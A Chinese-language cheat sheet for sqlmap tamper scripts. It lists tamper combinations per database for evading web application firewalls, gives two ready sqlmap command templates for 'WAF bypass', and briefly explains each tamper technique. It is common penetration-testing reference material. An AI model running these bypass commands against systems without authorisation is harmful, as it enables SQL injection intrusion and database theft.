# tamper 脚本速查表
## tamper 选择速查

| 目标数据库 | 推荐 tamper 组合 |
|-----------|------------------|
| MySQL (通用) | `space2comment,between,randomcase` |
| MySQL (强 WAF) | `space2comment,equaltolike,greatest,halfversionedmorekeywords` |
| MSSQL | `space2comment,between,charencode` |
| PostgreSQL | `space2comment,between` |
| 通用编码绕过 | `charencode,chardoubleencode` |
| 内联注释 | `versionedmorekeywords,halfversionedmorekeywords` |

```bash
# 基础 WAF 绕过
timeout 480 sqlmap -u 'URL' \
    --tamper=space2comment,between,randomcase \
    --random-agent --batch \
    2>&1 | tee /tmp/sqlmap_output.log

# 强 WAF 绕过
timeout 480 sqlmap -u 'URL' \
    --tamper=space2comment,equaltolike,greatest,charencode \
    --random-agent --delay 1 --batch \
    2>&1 | tee /tmp/sqlmap_output.log
```

## 常用 tamper 脚本说明

| tamper | 作用 |
|--------|------|
| `space2comment` | 空格 → `/**/` |
| `between` | `>` → `BETWEEN` |
| `randomcase` | 关键字随机大小写 |
| `equaltolike` | `=` → `LIKE` |
| `charencode` | 字符 URL 编码 |
| `chardoubleencode` | 字符双重 URL 编码 |
| `greatest` | `>` → `GREATEST(x,y)` |
| `halfversionedmorekeywords` | MySQL 内联注释 |
| `apostrophenullencode` | `'` → `%00'` |
| `base64encode` | Base64 编码 payload |
